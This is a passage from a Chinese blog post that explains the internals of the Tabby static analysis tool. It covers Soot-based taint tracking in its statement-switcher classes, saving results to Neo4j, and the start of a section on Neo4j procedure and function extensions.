title="merge"></a>merge</h5><p>may analysis，merge应该用并集</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Map&lt;Local, TabbyVariable&gt; in1, Map&lt;Local, TabbyVariable&gt; in2, Map&lt;Local, TabbyVariable&gt; out)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// if else while 分支汇聚的时候 对结果集进行处理 取并集</span></span><br><span class="line">    copy(in1, out);</span><br><span class="line"></span><br><span class="line">    in2.forEach((local, in2Var) -&gt; &#123;<span class="comment">// 取并集</span></span><br><span class="line">        TabbyVariable outVar = out.get(local);</span><br><span class="line">        <span class="keyword">if</span>(outVar != <span class="keyword">null</span>)&#123;</span><br><span class="line">            outVar.union(in2Var);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            out.put(local, in2Var);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="flowThrough"><a href="#flowThrough" class="headerlink" title="flowThrough"></a>flowThrough</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">flowThrough</span><span class="params">(Map&lt;Local, TabbyVariable&gt; in, Unit d, Map&lt;Local, TabbyVariable&gt; out)</span> </span>&#123;</span><br><span class="line">    Map&lt;Local, TabbyVariable&gt; newIn = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    copy(in, newIn);</span><br><span class="line">    context.setLocalMap(newIn);</span><br><span class="line">    context.setInitialMap(initialMap);</span><br><span class="line">    stmtSwitcher.setContext(context);</span><br><span class="line">    stmtSwitcher.setDataContainer(dataContainer);</span><br><span class="line">    d.apply(stmtSwitcher);</span><br><span class="line">    out.putAll(clean(context.getLocalMap()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里引入了stmtSwitcher</p><h5 id="doAnalysis"><a href="#doAnalysis" class="headerlink" title="doAnalysis"></a>doAnalysis</h5><p>引用cokeBeer 师傅的总结：</p><blockquote><p>这里我们来看作者实现的doAnalysis方法，它使用了getUseAndDefBoxes方法，获取jimple语言表示下的所有局部变量定义和调用情况，然后基于基础数据类型、局部变量、实例成员和数组四种数据类型的判断，分别处理以后保存到InitialMap中。这样InitialMap中就保存了方法调用过程中所有可能用到的局部变量。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAnalysis</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="comment">// getUseAndDefBoxes 获取jimple语言表示下的所有局部变量定义和调用情况</span></span><br><span class="line">       <span class="keyword">for</span>(ValueBox box:body.getUseAndDefBoxes())&#123;</span><br><span class="line">           Value value = box.getValue();</span><br><span class="line">           Type type = value.getType();</span><br><span class="line">           <span class="keyword">if</span>(type <span class="keyword">instanceof</span> PrimType)&#123; <span class="comment">// 对于基础数据类型 直接跳过</span></span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(value <span class="keyword">instanceof</span> Local &amp;&amp; !initialMap.containsKey(value))&#123;</span><br><span class="line">               initialMap.put((Local) value, TabbyVariable.makeLocalInstance((Local) value));</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span>(value <span class="keyword">instanceof</span> InstanceFieldRef)&#123;</span><br><span class="line">               InstanceFieldRef ifr = (InstanceFieldRef) value;</span><br><span class="line">               SootField sootField = ifr.getField();</span><br><span class="line">               SootFieldRef sfr = ifr.getFieldRef();</span><br><span class="line"></span><br><span class="line">               String signature = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">if</span>(sootField != <span class="keyword">null</span>)&#123;</span><br><span class="line">                   signature = sootField.getSignature();</span><br><span class="line">               &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sfr != <span class="keyword">null</span>)&#123;</span><br><span class="line">                   signature = sfr.getSignature();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               Value base = ifr.getBase();</span><br><span class="line">               <span class="keyword">if</span>(base <span class="keyword">instanceof</span> Local)&#123;</span><br><span class="line">                   TabbyVariable baseVar = initialMap.get(base);</span><br><span class="line">                   <span class="keyword">if</span>(baseVar == <span class="keyword">null</span>)&#123;</span><br><span class="line">                       baseVar = TabbyVariable.makeLocalInstance((Local) base);</span><br><span class="line">                       initialMap.put((Local) base, baseVar);</span><br><span class="line">                   &#125;</span><br><span class="line">                   TabbyVariable fieldVar = baseVar.getField(signature);</span><br><span class="line">                   <span class="keyword">if</span>(fieldVar == <span class="keyword">null</span>)&#123;</span><br><span class="line">                       <span class="keyword">if</span>(sootField != <span class="keyword">null</span>)&#123;</span><br><span class="line">                           fieldVar = TabbyVariable.makeFieldInstance(baseVar, sootField);</span><br><span class="line">                       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sfr != <span class="keyword">null</span>)&#123;</span><br><span class="line">                           fieldVar = TabbyVariable.makeFieldInstance(baseVar, sfr);</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">if</span>(fieldVar != <span class="keyword">null</span> &amp;&amp; signature != <span class="keyword">null</span>)&#123;</span><br><span class="line">                           fieldVar.setOrigin(value);</span><br><span class="line">                           baseVar.addField(signature, fieldVar);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span>(value <span class="keyword">instanceof</span> ArrayRef)&#123;</span><br><span class="line">               ArrayRef v = (ArrayRef) value;</span><br><span class="line">               Value base = v.getBase();</span><br><span class="line">               <span class="keyword">if</span>(base <span class="keyword">instanceof</span> Local)&#123;</span><br><span class="line">                   TabbyVariable baseVar = initialMap.get(base);</span><br><span class="line">                   <span class="keyword">if</span>(baseVar == <span class="keyword">null</span>)&#123;</span><br><span class="line">                       baseVar = TabbyVariable.makeLocalInstance((Local) base);</span><br><span class="line">                       initialMap.put((Local) base, baseVar);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">super</span>.doAnalysis();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-3-SimpleStmtSwitcher"><a href="#3-2-3-SimpleStmtSwitcher" class="headerlink" title="3.2.3 SimpleStmtSwitcher"></a>3.2.3 SimpleStmtSwitcher</h4><p>继承关系 SimpleStmtSwitcher -&gt; StmtSwitcher  -&gt; AbstractStmtSwitch -&gt; StmtSwitch</p><p><strong>StmtSwitch</strong></p><blockquote><p>Soot 在将Java翻译成Jimple过程中，提供了AbstractStmtSwitch 和soot.jimple.AbstractJimpleValueSwitch两个重要接口。AbstractStmtSwitch 是一个抽象访问类，它为Java(Soot)不同类型的stmts提供操作方法methods。AbstractJimpleValueSwitch 也是一个抽象访问者，它可以为操作virtualInvoke, specialInvoke, add表达式。</p></blockquote><p>简单来讲，就是可以通过StmtSwitch，“hook” 住每一个Stmt的分析过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractStmtSwitch</span> <span class="keyword">implements</span> <span class="title">StmtSwitch</span> </span>&#123;</span><br><span class="line">  Object result;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseBreakpointStmt</span><span class="params">(BreakpointStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseInvokeStmt</span><span class="params">(InvokeStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseAssignStmt</span><span class="params">(AssignStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseIdentityStmt</span><span class="params">(IdentityStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseEnterMonitorStmt</span><span class="params">(EnterMonitorStmt stmt)</span> </span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseExitMonitorStmt</span><span class="params">(ExitMonitorStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseGotoStmt</span><span class="params">(GotoStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseIfStmt</span><span class="params">(IfStmt stmt)</span></span></span><br></pre></td></tr></table></figure><p>StmtSwitch的应用：通过Switchable#apply</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Unit</span> <span class="keyword">extends</span> <span class="title">Switchable</span>, <span class="title">Host</span>, <span class="title">Serializable</span>, <span class="title">Context</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Switchable</span> </span>&#123;</span><br><span class="line">  <span class="comment">/** Called when this object is visited. */</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">apply</span><span class="params">(Switch sw)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SimpleStmtSwitcher 实现了以下的接口：</p><h5 id="caseAssignStmt"><a href="#caseAssignStmt" class="headerlink" title="caseAssignStmt"></a>caseAssignStmt</h5><p>AssignStmt是一个正常的复制语句，比如说可以给一个堆栈变量$stack5赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stack5 = newarray (java.lang.Object)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>对应的操作逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseAssignStmt</span><span class="params">(AssignStmt stmt)</span> </span>&#123;</span><br><span class="line">    Value lop = stmt.getLeftOp();</span><br><span class="line">    Value rop = stmt.getRightOp();</span><br><span class="line">    TabbyVariable rvar = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">boolean</span> unbind = <span class="keyword">false</span>;</span><br><span class="line">    rightValueSwitcher.setUnit(stmt);</span><br><span class="line">    rightValueSwitcher.setContext(context);</span><br><span class="line">    rightValueSwitcher.setDataContainer(dataContainer);</span><br><span class="line">    rightValueSwitcher.setResult(<span class="keyword">null</span>);</span><br><span class="line">    rop.apply(rightValueSwitcher);</span><br><span class="line">    Object result = rightValueSwitcher.getResult();</span><br><span class="line">    <span class="keyword">if</span>(result <span class="keyword">instanceof</span> TabbyVariable)&#123;</span><br><span class="line">        rvar = (TabbyVariable) result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rop <span class="keyword">instanceof</span> Constant &amp;&amp; !(rop <span class="keyword">instanceof</span> StringConstant))&#123;</span><br><span class="line">        unbind = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rvar != <span class="keyword">null</span> &amp;&amp; rvar.getValue() != <span class="keyword">null</span> &amp;&amp; rvar.getValue().getType() <span class="keyword">instanceof</span> PrimType)&#123;</span><br><span class="line">        rvar = <span class="keyword">null</span>; <span class="comment">// 剔除基础元素的污点传递，对于我们来说，这部分是无用的分析</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理左值</span></span><br><span class="line">    <span class="keyword">if</span>(rvar != <span class="keyword">null</span> || unbind)&#123;</span><br><span class="line">        leftValueSwitcher.setContext(context);</span><br><span class="line">        leftValueSwitcher.setMethodRef(methodRef);</span><br><span class="line">        leftValueSwitcher.setRvar(rvar);</span><br><span class="line">        leftValueSwitcher.setUnbind(unbind);</span><br><span class="line">        lop.apply(leftValueSwitcher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进 lop.apply(leftValueSwitcher)，以caseLocal为例，针对Local变量赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseLocal</span><span class="params">(Local v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(v.getType() <span class="keyword">instanceof</span> PrimType) <span class="keyword">return</span>; <span class="comment">// 提出无用的类属性传递</span></span><br><span class="line"></span><br><span class="line">    TabbyVariable <span class="keyword">var</span> = context.getOrAdd(v);</span><br><span class="line"></span><br><span class="line">    generateAction(<span class="keyword">var</span>, rvar, -<span class="number">1</span>, unbind);</span><br><span class="line">    <span class="keyword">if</span>(unbind)&#123;</span><br><span class="line">        <span class="keyword">var</span>.clearVariableStatus();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">var</span>.assign(rvar, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generateAction(var, rvar, -1, unbind)，其中-1 表示this，最终调用</p><p>MethodReference#addAction </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAction</span><span class="params">(String key, String value)</span></span>&#123;</span><br><span class="line">    actions.put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>action 即是前文一节中的action结构。</p><h5 id="caseIdentityStmt"><a href="#caseIdentityStmt" class="headerlink" title="caseIdentityStmt"></a>caseIdentityStmt</h5><p>IdentityStmt通常指的是对变量赋值<br><code>r1 := 0: java.lang.String</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseIdentityStmt</span><span class="params">(IdentityStmt stmt)</span> </span>&#123;</span><br><span class="line">    Value lop = stmt.getLeftOp();</span><br><span class="line">    Value rop = stmt.getRightOp();</span><br><span class="line">    <span class="keyword">if</span>(rop <span class="keyword">instanceof</span> ThisRef)&#123;</span><br><span class="line">        context.bindThis(lop);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(rop <span class="keyword">instanceof</span> ParameterRef)&#123;</span><br><span class="line">        ParameterRef pr = (ParameterRef)rop;</span><br><span class="line">        context.bindArg((Local)lop, pr.getIndex());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="caseReturnStmt"><a href="#caseReturnStmt" class="headerlink" title="caseReturnStmt"></a>caseReturnStmt</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseReturnStmt</span><span class="params">(ReturnStmt stmt)</span> </span>&#123;</span><br><span class="line">    Value value = stmt.getOp();</span><br><span class="line">    TabbyVariable <span class="keyword">var</span> = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 近似处理 只要有一种return的情况是可控的，就认为函数返回是可控的</span></span><br><span class="line">    <span class="comment">// 并结算当前的入参区别</span></span><br><span class="line">    <span class="keyword">if</span>(context.getReturnVar() != <span class="keyword">null</span> &amp;&amp; context.getReturnVar().containsPollutedVar(<span class="keyword">new</span> ArrayList&lt;&gt;())) <span class="keyword">return</span>;</span><br><span class="line">    rightValueSwitcher.setUnit(stmt);</span><br><span class="line">    rightValueSwitcher.setContext(context);</span><br><span class="line">    rightValueSwitcher.setDataContainer(dataContainer);</span><br><span class="line">    rightValueSwitcher.setResult(<span class="keyword">null</span>);</span><br><span class="line">    value.apply(rightValueSwitcher);</span><br><span class="line">    <span class="keyword">var</span> = (TabbyVariable) rightValueSwitcher.getResult();</span><br><span class="line">    context.setReturnVar(<span class="keyword">var</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">var</span> != <span class="keyword">null</span> &amp;&amp; <span class="keyword">var</span>.isPolluted(-<span class="number">1</span>) &amp;&amp; reset)&#123;</span><br><span class="line">        methodRef.addAction(<span class="string">&quot;return&quot;</span>, <span class="keyword">var</span>.getValue().getRelatedType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="caseInvokeStmt"><a href="#caseInvokeStmt" class="headerlink" title="caseInvokeStmt"></a>caseInvokeStmt</h5><p>caseInvokeStmt 处理方法调用语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseInvokeStmt</span><span class="params">(InvokeStmt stmt)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// extract baseVar and args</span></span><br><span class="line">    InvokeExpr ie = stmt.getInvokeExpr();</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;&lt;java.lang.Object: void &lt;init&gt;()&gt;&quot;</span>.equals(ie.getMethodRef().getSignature())) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(GlobalConfiguration.DEBUG)&#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Analysis: &quot;</span>+ie.getMethodRef().getSignature() + <span class="string">&quot;; &quot;</span>+context.getTopMethodSignature());</span><br><span class="line">    &#125;</span><br><span class="line">    Switcher.doInvokeExprAnalysis(stmt, ie, dataContainer, context);</span><br><span class="line">    <span class="keyword">if</span>(GlobalConfiguration.DEBUG) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Analysis: &quot;</span> + ie.getMethodRef().getName() + <span class="string">&quot; done, return to&quot;</span> + context.getMethodSignature() + <span class="string">&quot;; &quot;</span>+context.getTopMethodSignature());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中Switcher.doInvokeExprAnalysis 具体详细实现了函数调用的污点跟踪。</p><blockquote><p>疑问<br>GI是通过逆拓扑排序，确保处理方法调用的时候，其传播函数是已知的，这里Switcher.doInvokeExprAnalysis是如何处理的呢？</p></blockquote><h4 id="3-2-4-污点跟踪"><a href="#3-2-4-污点跟踪" class="headerlink" title="3.2.4 污点跟踪"></a>3.2.4 污点跟踪</h4><p>整个调用过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Analyser#runSootAnalysis</span><br><span class="line">  CallGraphScanner#run</span><br><span class="line">  CallGraphScanner#collect</span><br><span class="line">    CallGraphCollector#collect</span><br><span class="line">      Switcher#doMethodAnalysis</span><br><span class="line">        PollutedVarsPointsToAnalysis#makeDefault</span><br><span class="line">          SimpleStmtSwitcher#caseInvokeStmt</span><br><span class="line">            Switcher.doInvokeExprAnalysis</span><br><span class="line">              Switcher#buildCallRelationship</span><br><span class="line">              Call#setPollutedPosition &#x2F;&#x2F; 设置Call的PollutedPosition</span><br><span class="line">              Switcher#doMethodAnalysis</span><br><span class="line">          SimpleStmtSwitcher#caseIdentityStmt</span><br><span class="line">          SimpleStmtSwitcher#caseAssignStmt</span><br><span class="line">            lop.apply(leftValueSwitcher)</span><br><span class="line">              SimpleLeftValueSwitcher#caseLocal</span><br><span class="line">              SimpleLeftValueSwitcher#caseArrayRef</span><br><span class="line">                methodRef#addAction &#x2F;&#x2F; 设置Method 的action</span><br><span class="line">          SimpleStmtSwitcher#caseReturnStmt</span><br><span class="line">            methodRef#addAction &#x2F;&#x2F; 设置Method 的action</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Analyser#runSootAnalysis</span><br><span class="line">  ClassInfoScanner#run</span><br><span class="line">  ClassInfoScanner#loadAndExtract</span><br><span class="line">    ClassInfoCollector#collect</span><br><span class="line">    ClassInfoCollector#collect0</span><br><span class="line">    ClassInfoCollector#extractMethodInfo</span><br><span class="line">      methodRef#setPollutedPosition &#x2F;&#x2F;注意此处只是load 已知Sink&#x2F;knowledge</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到以上的路径中，完成了对Method.action 和Call.pollutedPosition 的赋值</p><blockquote><p>** 疑问 **<br>Method.pollutedPosition 属于v1使用的传播，是已经废弃了吗？<br>答案是YES，在后面的tabby-path-finder中，用到了两处pollutedPosition，一处是在初始化sink method的时候，用到了获取其method.pollutedPosition，在往后的传播过程中，都用的是Call边的pollutedPosition。</p></blockquote><h3 id="3-3-结果保存"><a href="#3-3-结果保存" class="headerlink" title="3.3 结果保存"></a>3.3 结果保存</h3><p>采用SpringBoot架构，通过定义Registry与对应Service，可以方便的进行数据库的存储。</p><p><img src="/images/pasted-342.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">App#run</span><br><span class="line">  Analyser#run</span><br><span class="line">  Analyser#save</span><br><span class="line">    DataCenter#save2Neo4j</span><br><span class="line">    DataCenter#save2CSV</span><br></pre></td></tr></table></figure><h2 id="0x04-Tabby-Path-Finder"><a href="#0x04-Tabby-Path-Finder" class="headerlink" title="0x04 Tabby-Path-Finder"></a>0x04 Tabby-Path-Finder</h2><h3 id="4-1-Neo4j接口"><a href="#4-1-Neo4j接口" class="headerlink" title="4.1 Neo4j接口"></a>4.1 Neo4j接口</h3><p>参考Neo4j 官方的扩展接口文档【10】。</p><h4 id="4-1-1-插件extending"><a href="#4-1-1-插件extending" class="headerlink" title="4.1.1 插件extending"></a>4.1.1 插件extending</h4><h5 id="Procedure-和Function-区别"><a href="#Procedure-和Function-区别" class="headerlink" title="Procedure 和Function 区别"></a>Procedure 和Function 区别</h5><blockquote><ul><li>Functions are simple computations / conversions and return a single value</li><li>Functions can be used in any expression or predicate</li><li>Procedures are more complex operations and generate streams of results.</li><li>Procedures must be used within the CALL clause and YIELD their result columns</li><li>They can generate, fetch or compute data to make it available to later processing steps in your Cypher query</li></ul></blockquote><ul><li>Function 是比较简单的计算逻辑，只能return string</li><li>Function 可以在任意的表达式里/predicate 里调用</li><li>Procedure 更加复杂，返回的是streams</li><li>Procedure 必须用CALL 进行调用，用YIELD 进行结果指定</li><li>它们都能够生成/获取/计算数据，用于下一步的Cypher query计算</li></ul><h5 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h5><p>通过@Procedure</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.neo4j.procedure.Procedure;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetRelationshipTypes</span> </span>&#123;</span><br><span class="line"><span class="meta">@Procedure(value = &quot;example.getRelationshipTypes&quot;)</span></span><br><span class="line">    <span class="meta">@Description(&quot;Get the different relationships going in and out of a node.&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Stream&lt;RelationshipTypes&gt; <span class="title">getRelationshipTypes</span><span class="params">(<span class="meta">@Name(&quot;node&quot;)</span> Node node)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; outgoing = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        node.getRelationships(Direction.OUTGOING).iterator()</span><br><span class="line">            .forEachRemaining(rel -&gt; AddDistinct(outgoing, rel));</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; incoming = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        node.getRelationships(Direction.INCOMING).iterator()</span><br><span class="line">                .forEachRemaining(rel -&gt; AddDistinct(incoming, rel));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Stream.of(<span class="keyword">new</span> RelationshipTypes(incoming, outgoing));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 